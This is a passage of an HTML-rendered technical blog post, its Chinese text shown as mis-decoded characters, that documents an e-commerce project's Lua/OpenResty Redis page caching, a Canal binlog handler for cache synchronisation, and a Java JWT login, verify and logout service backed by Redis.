class="line"><span class="keyword">local</span> categoryStr = read_cache(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, categoryKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> categoryStr <span class="keyword">then</span>  </span><br><span class="line">   <span class="keyword">local</span> idStr = <span class="built_in">table</span>.<span class="built_in">concat</span>(spuInfo[<span class="string">&quot;categoryIds&quot;</span>],<span class="string">&quot;,&quot;</span>);</span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found category info, back to http, categoryIds : &quot;</span>, idStr)  </span><br><span class="line">   categoryStr = read_http(<span class="string">&quot;/categories/&quot;</span>, &#123;ids  = idStr&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> categoryStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found categoryStr info, categoryId : &quot;</span>, cid3)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- è·å–å“ç‰Œ  </span></span><br><span class="line"><span class="keyword">local</span> brandId = spuInfo[<span class="string">&quot;brandId&quot;</span>]</span><br><span class="line"><span class="keyword">local</span> brandKey = <span class="string">&quot;page:brand:id:&quot;</span>..brandId </span><br><span class="line"><span class="keyword">local</span> brandStr = read_cache(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, brandKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> brandStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found brand info, back to http, brandId : &quot;</span>, brandId)  </span><br><span class="line">   brandStr = read_http(<span class="string">&quot;/brand/&quot;</span>..brandId, &#123;&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> brandStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found brandStr info, brandId : &quot;</span>, brandId)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- è·å–è§„æ ¼</span></span><br><span class="line"><span class="keyword">local</span> specKey = <span class="string">&quot;page:spec:id:&quot;</span>..cid3 </span><br><span class="line"><span class="keyword">local</span> specStr = read_cache(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6379</span>, specKey)  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> specStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;redis not found spec info, back to http, cid3 : &quot;</span>, cid3)  </span><br><span class="line">   specStr = read_http(<span class="string">&quot;/spec/&quot;</span>..cid3, &#123;&#125;)</span><br><span class="line"><span class="keyword">end</span>  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> specStr <span class="keyword">then</span>  </span><br><span class="line">   ngx_log(ngx_ERR, <span class="string">&quot;http not found specStr info, cid3 : &quot;</span>, cid3)  </span><br><span class="line">   <span class="keyword">return</span> ngx_exit(<span class="number">404</span>)  </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">-- ç»„ç»‡æ•°æ®1</span></span><br><span class="line"><span class="keyword">local</span> context = &#123;</span><br><span class="line">	name = spuInfo[<span class="string">&quot;name&quot;</span>],</span><br><span class="line">	skuList =  skuInfoStr,</span><br><span class="line">	detail =  detailInfoStr,</span><br><span class="line">	categories =  categoryStr,</span><br><span class="line">	brand =  brandStr,</span><br><span class="line">	specs =  specStr</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">--æ¸²æŸ“æ¨¡æ¿  1</span></span><br><span class="line">template.render(<span class="string">&quot;item.html&quot;</span>, context)  </span><br></pre></td></tr></table></figure>

<h3 id="Canalå®ç°ç¼“å­˜æ•°æ®åŒæ­¥"><a href="#Canalå®ç°ç¼“å­˜æ•°æ®åŒæ­¥" class="headerlink" title="Canalå®ç°ç¼“å­˜æ•°æ®åŒæ­¥"></a>Canalå®ç°ç¼“å­˜æ•°æ®åŒæ­¥</h3><p>MySQLä¸»å¤‡å¤åˆ¶åŸç†</p>
<ul>
<li>MySQL master å°†<strong>æ•°æ®å˜æ›´</strong>å†™å…¥äºŒè¿›åˆ¶æ—¥å¿—( binary log, å…¶ä¸­è®°å½•å«åšäºŒè¿›åˆ¶æ—¥å¿—äº‹ä»¶binary log eventsï¼Œå¯ä»¥é€šè¿‡ show binlog events è¿›è¡ŒæŸ¥çœ‹)</li>
<li>MySQL slave å°† master çš„ binary log events æ‹·è´åˆ°å®ƒçš„ä¸­ç»§æ—¥å¿—(relay log)</li>
<li>MySQL slave é‡æ”¾ relay log ä¸­äº‹ä»¶ï¼Œå°†æ•°æ®å˜æ›´åæ˜ å®ƒè‡ªå·±çš„æ•°æ®</li>
</ul>
<p>canal å·¥ä½œåŸç†</p>
<ul>
<li>canal æ¨¡æ‹Ÿ MySQL slave çš„äº¤äº’åè®®ï¼Œä¼ªè£…è‡ªå·±ä¸º MySQL slave ï¼Œå‘ MySQL master å‘é€dump åè®®</li>
<li>MySQL master æ”¶åˆ° dump è¯·æ±‚ï¼Œå¼€å§‹æ¨é€ binary log ç»™ slave (å³ canal )</li>
<li>Canal è§£æ binary log å¯¹è±¡(åŸå§‹ä¸º byte æµ)</li>
</ul>
<h4 id="å…³é”®ä»£ç ï¼š"><a href="#å…³é”®ä»£ç ï¼š" class="headerlink" title="å…³é”®ä»£ç ï¼š"></a>å…³é”®ä»£ç ï¼š</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.page.canal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.page.service.PageService;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.annotation.CanalTable;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.context.CanalContext;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.handler.EntryHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-04 2:52 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@CanalTable(value = &quot;all&quot;)</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CanalHandler</span> <span class="keyword">implements</span> <span class="title class_">EntryHandler</span>&lt;Map&lt;String, String&gt;&gt;&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PageService pageService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CanalHandler</span><span class="params">(PageService pageService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.pageService = pageService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(Map&lt;String,String&gt; model)</span> &#123;</span><br><span class="line">        <span class="comment">// è·å–è¡¨çš„åç§°</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="comment">// å¦‚æœè¡¨æ˜¯tb_sku</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;skuæ–°å¢äº†&#123;&#125;&quot;</span>, model);</span><br><span class="line">            pageService.loadSkuListData(Long.valueOf(model.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(Map&lt;String,String&gt; before, Map&lt;String,String&gt; after)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;skuä¿®æ”¹äº†&#123;&#125;&quot;</span>, after);</span><br><span class="line">            pageService.loadSkuListData(Long.valueOf(after.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(Map&lt;String,String&gt; model)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;skuåˆ é™¤äº†&#123;&#125;&quot;</span>, model);</span><br><span class="line">            pageService.deleteSku(Long.valueOf(model.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="JWTç™»é™†å®ç°"><a href="#JWTç™»é™†å®ç°" class="headerlink" title="JWTç™»é™†å®ç°"></a>JWTç™»é™†å®ç°</h2><p>ç”¨æˆ·æˆæƒç›´æ¥åœ¨ç½‘å…³åšï¼Œå¦‚æœåœ¨æ¯ä¸ªå¾®æœåŠ¡å•ç‹¬åšæƒé™æ§åˆ¶ï¼Œæ¯ä¸ªå¾®æœåŠ¡ä¸Šçš„æƒé™ä»£ç å°±ä¼šæœ‰é‡å¤ã€‚</p>
<p>æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120506.png" alt="image-20210704023834746"></p>
<p>æƒé™æ§åˆ¶æµç¨‹ï¼š</p>
<ul>
<li><p>è·å–ç”¨æˆ·çš„ç™»é™†å‡­è¯jwt</p>
</li>
<li><p>è§£æjwtï¼Œè·å–ç”¨æˆ·èº«ä»½</p>
<ul>
<li>å¦‚æœè§£æå¤±è´¥ï¼Œè¯æ˜æ²¡æœ‰ç™»é™†ï¼Œè¿”å›401</li>
</ul>
</li>
<li><p>æ ¹æ®èº«ä»½ï¼ŒæŸ¥è¯¢ç”¨æˆ·æƒé™ä¿¡æ¯</p>
</li>
<li><p>è·å–å½“å‰è¯·æ±‚èµ„æºï¼ˆå¾®æœåŠ¡æ¥å£è·¯å¾„ï¼‰</p>
</li>
<li><p>åˆ¤æ–­æ˜¯å¦æœ‰è®¿é—®çš„èµ„æºçš„æƒé™ï¼ˆé€šè¿‡åˆ™æ”¾è¡Œï¼Œä¸é€šè¿‡åˆ™è¿”å›401ï¼‰</p>
</li>
</ul>
<h3 id="Tokenå¤±æ•ˆé—®é¢˜å…·ä½“å®ç°"><a href="#Tokenå¤±æ•ˆé—®é¢˜å…·ä½“å®ç°" class="headerlink" title="Tokenå¤±æ•ˆé—®é¢˜å…·ä½“å®ç°"></a>Tokenå¤±æ•ˆé—®é¢˜å…·ä½“å®ç°</h3><p>JWTçš„æ— æ³•ä¿®æ”¹ç‰¹æ€§ã€‚å› æ­¤<strong>æˆ‘ä»¬ä¸èƒ½ä¿®æ”¹tokenæ¥æ ‡è®°tokenæ— æ•ˆï¼Œè€Œæ˜¯åœ¨æœåŠ¡ç«¯è®°å½•tokençŠ¶æ€</strong>ï¼Œäºæ˜¯å°±è¿èƒŒäº†æ— çŠ¶æ€æ€§çš„ç‰¹æ€§ã€‚</p>
<p>å®ç°æ€è·¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>ç”¨æˆ·ç™»é™†åï¼Œç”ŸæˆJWTï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·èº«ä»½ã€JWTçš„IDï¼ˆJTIï¼‰</li>
<li>ä»¥ç”¨æˆ·idä¸ºkeyï¼ŒæŠŠJWTçš„idå­˜å…¥redisï¼Œåªæœ‰redisä¸­æœ‰çš„JWTï¼Œæ‰æ˜¯æœ‰æ•ˆçš„JWT</li>
<li>å¹¶ä¸”ç»™Redisä¸­çš„ç”¨æˆ·idè®¾ç½®æœ‰æ•ˆæœŸï¼Œè®¾ç½®ä¸º30åˆ†é’Ÿï¼Œæœ‰æ•ˆæœŸåˆ°è‡ªåŠ¨åˆ é™¤ï¼Œç™»é™†å¤±æ•ˆ</li>
<li>é€€å‡ºç™»é™†çš„æ—¶å€™ï¼ŒæŠŠJTIä»Redisåˆ é™¤ï¼ŒæŠŠJWTä»cookieä¸­åˆ é™¤å³å¯ã€‚</li>
</ul>
<p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120507.png" alt="image-20210704024901219"></p>
<p>å…·ä½“ä»£ç å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.service.UserAuthService;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.BaseRedisConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exception.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.CookieUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.user.client.UserClient;</span><br><span class="line"><span class="keyword">import</span> com.leyou.user.dto.UserDTO;</span><br><span class="line"><span class="keyword">import</span> feign.FeignException;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.JwtException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseTokenConstants.COOKIE_NAME;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseTokenConstants.DOMAIN;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-06 9:05 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAuthServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserAuthService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserClient userClient;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties jwtProperties;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserAuthServiceImpl</span><span class="params">(UserClient userClient, JwtProperties jwtProperties, StringRedisTemplate redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userClient = userClient;</span><br><span class="line">        <span class="built_in">this</span>.jwtProperties = jwtProperties;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String username, String password, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç ä¸èƒ½ä¸ºç©º&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.æŸ¥è¯¢ç”¨æˆ·</span></span><br><span class="line">        <span class="type">UserDTO</span> <span class="variable">userDTO</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            userDTO = userClient.queryUserByUsernameAndPassword(username, password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FeignException e) &#123;</span><br><span class="line">            <span class="comment">// æ•æ‰feignçš„å¼‚å¸¸ï¼Œå¹¶è·å–feignè°ƒç”¨çŠ¶æ€ç å’Œå¼‚å¸¸ä¿¡æ¯</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(e.status(), e.contentUTF8(), e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2.åˆ¤æ–­æŸ¥è¯¢ç»“æœ</span></span><br><span class="line">        <span class="keyword">if</span> (userDTO == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.ç”Ÿæˆtoken</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jti</span> <span class="operator">=</span> JwtUtils.createJTI();</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> JwtUtils.generateTokenWithJTI(<span class="keyword">new</span> <span class="title class_">UserInfo</span>(userDTO.getId(), username, <span class="literal">null</span>)</span><br><span class="line">                , jti, jwtProperties.getPrivateKey());</span><br><span class="line">        <span class="comment">// 4.å°†jtiå­˜å…¥redis</span></span><br><span class="line">        redisTemplate.opsForValue().set(BaseRedisConstants.JTI_KEY_PREFIX + userDTO.getId(), jti,</span><br><span class="line">                BaseRedisConstants.TOKEN_EXPIRE_MINUTES, TimeUnit.MINUTES);</span><br><span class="line">        <span class="comment">// 5.å†™å…¥cookie</span></span><br><span class="line">        <span class="comment">// &quot;/&quot;ä»£è¡¨ä¸€åˆ‡è·¯å¾„éƒ½æœ‰æ•ˆ</span></span><br><span class="line">        CookieUtils.builder(response)</span><br><span class="line">                .domain(DOMAIN)</span><br><span class="line">                .maxAge(-<span class="number">1</span>)</span><br><span class="line">                .path(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">                .httpOnly(<span class="literal">true</span>)</span><br><span class="line">                .build(COOKIE_NAME, token);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">verify</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.è·å–cookie</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, COOKIE_NAME);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(token)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;ç”¨æˆ·æœªç™»å½•æˆ–è€…è¶…æ—¶&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2.éªŒè¯cookieçš„æ­£ç¡®æ€§</span></span><br><span class="line">        Payload&lt;UserInfo&gt; payload = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            payload = JwtUtils.getInfoFromToken(token, jwtProperties.getPublicKey(), UserInfo.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;ç”¨æˆ·æœªç™»å½•æˆ–è€…ä¸å­˜åœ¨&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//3.è·å–cookieä¸­çš„username</span></span><br><span class="line">        <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">        <span class="keyword">if</span> (userInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;ç”¨æˆ·æœªç™»å½•æˆ–è€…ä¸å­˜åœ¨&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jti</span> <span class="operator">=</span> redisTemplate.opsForValue().get(BaseRedisConstants.JTI_KEY_PREFIX + userInfo.getId());</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.equals(jti, payload.getId())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;ç™»å½•å¤±æ•ˆ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> userInfo.getUsername();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//å°†redisä¸­tokenåˆ é™¤</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, COOKIE_NAME);</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isEmpty(token)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;æœªçŸ¥é”™è¯¯,æœªç™»å½•ä¸è¯¥ç‚¹åˆ°è¿™ä¸ªæŒ‰é’®&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Payload&lt;UserInfo&gt; payload = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                payload = JwtUtils.getInfoFromToken(token, jwtProperties.getPublicKey(), UserInfo.class);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;ä¸å­˜åœ¨token?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//3.è·å–cookieä¸­çš„username</span></span><br><span class="line">            <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">            <span class="keyword">if</span> (userInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;æœªçŸ¥é”™è¯¯,æœªç™»å½•ä¸è¯¥ç‚¹åˆ°è¿™ä¸ªæŒ‰é’®&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            redisTemplate.delete(BaseRedisConstants.JTI_KEY_PREFIX + userInfo.getId());</span><br><span class="line">            <span class="comment">//å°†cookieæ—¶é—´è®¾ç½®ä¸º0</span></span><br><span class="line">            CookieUtils.deleteCookie(COOKIE_NAME, DOMAIN, response);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LyException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;æœªçŸ¥é”™è¯¯,æœªç™»å½•ä¸è¯¥ç‚¹åˆ°è¿™ä¸ªæŒ‰é’®&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;é€€å‡ºç™»å½•å¤±è´¥&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//controller</span></span><br><span class="line"><span class="keyword">package</span> com.leyou.auth.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.service.UserAuthService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-06 9:31 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAuthController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserAuthService service;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserAuthController</span><span class="params">(UserAuthService service)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç™»å½•</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username ç”¨æˆ·å</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password å¯†ç </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> æ— </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username,</span></span><br><span class="line"><span class="params">                                      <span class="meta">@RequestParam(&quot;password&quot;)</span> String password,</span></span><br><span class="line"><span class="params">                                      HttpServletResponse response)</span> &#123;</span><br><span class="line">        service.login(username, password, response);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * éªŒè¯ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/verify&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">verify</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> service.verify(request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/logout&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        service.logout(request, response);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

